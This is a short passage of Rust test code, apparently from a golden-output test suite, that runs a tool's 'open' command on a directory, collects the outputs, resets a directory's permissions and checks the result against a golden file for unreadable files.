        vec!["open", d.to_str().unwrap()],
    ] {
        all.push_str(&format!(
            "=== {}\n{}",
            n.apply(&args.join(" ")),
            both_outputs(&n, &g(&tmp, &args).run())
        ));
    }
    lock(&d.join("locked"), 0o755);
    golden(SUITE, "unreadable_files", &all);
}
